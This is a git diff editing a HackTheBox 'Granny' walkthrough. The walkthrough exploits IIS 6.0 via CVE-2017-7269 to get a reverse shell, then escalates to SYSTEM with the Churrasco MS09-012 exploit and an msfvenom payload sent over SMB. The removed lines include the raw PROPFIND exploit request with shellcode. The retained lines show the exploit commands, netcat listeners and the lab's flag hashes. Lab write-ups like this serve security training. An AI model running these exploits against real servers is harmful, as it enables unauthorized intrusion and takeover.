@@ -50,27 +50,20 @@ Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds
 
 ![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Granny/Website.png?raw=true)
 
-It seems like the website is under construction…
-
-Maybe we could try traversing its directories? However, there were nothing much found…
+It seems like the website is under construction. There was also nothing much found from directory busting.
 
 # Exploitation
 
-From the `nmap` scan, we know that the website is running on `Microsoft IIS httpd 6.0`. So let’s do some Googling!
+From the `nmap` scan, we know that the website is running on `Microsoft IIS httpd 6.0`.
 
 ![Google_Search](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Granny/Google_Search.png?raw=true)
 
-It seems like this version has a vulnerability of `CVE-2017-7269`, so let’s try to find possible exploit scripts on GitHub.
-
-After searching around for awhile, I found this [GitHub](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) repository that contains an interesting reverse shell script. Let’s try to use this script! OwO
+It seems like this version has a vulnerability of `CVE-2017-7269`. This [GitHub](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) repository happens to have what we are looking for.
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
-└─# python exploit.py 10.10.10.15 80 10.10.14.3 1234                       1 ⨯
-PROPFIND / HTTP/1.1
-Host: localhost
-Content-Length: 1744
-If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
+└─# python exploit.py 10.10.10.15 80 10.10.14.3 1234
+...
 
 ┌──(shiro㉿shiro)-[~]
 └─$ nc -nlvp 1234 
@@ -80,7 +73,6 @@ Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
 
 c:\windows\system32\inetsrv>whoami
-whoami
 nt authority\network service
 
 C:\Documents and Settings>cd C:\Documents and Settings
@@ -96,8 +88,6 @@ C:\Documents and Settings>dir
 C:\Documents and Settings>cd Lakis
 Access is denied.
 ```
-
-It seems like we can’t even access the user flag :(
 
 # Privilege Escalation
 
@@ -142,11 +132,7 @@ Hotfix(s):                 1 Hotfix(s) Installed.
 Network Card(s):           N/A
 ```
 
-It seems like its running on `Windows Server 2003`. Let’s Google for some possible privilege escalation exploits! After reading through some websites, I found this vulnerability `MS09-012`.
-
-Thereafter, I searched for possible exploits on GitHub that I could use and I found this [repository](https://github.com/egre55/windows-kernel-exploits/blob/master/MS09-012:%20Churrasco/Compiled/Churrasco.exe).
-
-Let’s download the `pc.exe` and share it to the Windows machine through `impacket-smbserver`!
+It seems like its running on `Windows Server 2003` which is vulnerable to `MS09-012`. We can exploit this using [repository](https://github.com/egre55/windows-kernel-exploits/blob/master/MS09-012:%20Churrasco/Compiled/Churrasco.exe).
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
@@ -154,23 +140,14 @@ Let’s download the `pc.exe` and share it to the Windows machine through `impac
 
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
 └─# impacket-smbserver kali .
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
 ```
 
 Now, we need to create a `temp` directory in `C:\` to have writeable privileges. Then, we can copy the file over the SMB server we created.
 
-```bash
+```cmd
 c:\windows\system32\inetsrv>cd C:\
 C:\>mkdir temp
 C:\>cd temp
-
 C:\temp>dir \\10.10.14.3\KALI
 02/08/2022  05:09 PM    <DIR>          .
 02/08/2022  02:53 PM    <DIR>          ..
@@ -203,9 +180,7 @@ C:\temp>whoami
 nt authority\network service
 ```
 
-It seems like the exploit works… but only for 1 single command :(
-
-We can bypass this by creating a `msfvenom` payload as an `exe` file, transfer it through SMB server and then ask the exploit to run it!
+The exploit works, but only for 1 single command. We can bypass this by creating a `msfvenom` payload as an `exe` file, transfer it through SMB server and then ask the exploit to run it.
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
@@ -213,32 +188,21 @@ We can bypass this by creating a `msfvenom` payload as an `exe` file, transfer i
 
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
 └─# impacket-smbserver kali .
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+...
+```
 
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
-
+```cmd
 C:\temp>copy \\10.10.14.3\KALI\shell.exe .
         1 file(s) copied.
-
-C:\temp>dir
-02/08/2022  05:32 PM    <DIR>          .
-02/08/2022  05:32 PM    <DIR>          ..
-02/08/2022  05:24 PM            31,232 churrasco.exe
-02/08/2022  05:30 PM            73,802 shell.exe
-               2 File(s)        105,034 bytes
-               2 Dir(s)   1,322,684,416 bytes free
 ```
 
 Now, we can start yet another listener on our machine and execute the `shell.exe` using `churrasco.exe`!
 
-```bash
+```cmd
 C:\temp>churrasco.exe "C:\temp\shell.exe"
+```
 
+```bash
 ┌──(shiro㉿shiro)-[~/HackTheBox/Granny]
 └─$ nc -nlvp 1337
 listening on [any] 1337 ...
@@ -249,21 +213,11 @@ Microsoft Windows [Version 5.2.3790]
 C:\WINDOWS\TEMP>whoami
 nt authority\system
 
-C:\WINDOWS\TEMP>cd C:\Documents and Settings
-
-C:\Documents and Settings>dir
-04/12/2017  09:19 PM    <DIR>          .
-04/12/2017  09:19 PM    <DIR>          ..
-04/12/2017  08:48 PM    <DIR>          Administrator
-04/12/2017  04:03 PM    <DIR>          All Users
-04/12/2017  09:19 PM    <DIR>          Lakis
-
-C:\Documents and Settings>cd Lakis\Desktop
+C:\Documents and Settings>cd "C:\Documents and Settings\Lakis\Desktop"
 C:\Documents and Settings\Lakis\Desktop>type user.txt
 700c5dc163014e22b3e408f8703f67d1
 
-C:\Documents and Settings\Lakis\Desktop>cd C:\Documents and Settings\Administrator\Desktop
-
+C:\Documents and Settings\Lakis\Desktop>cd "C:\Documents and Settings\Administrator\Desktop"
 C:\Documents and Settings\Administrator\Desktop>type root.txt
 aa4beed1c0584445ab463a6747bd06e9
 ```
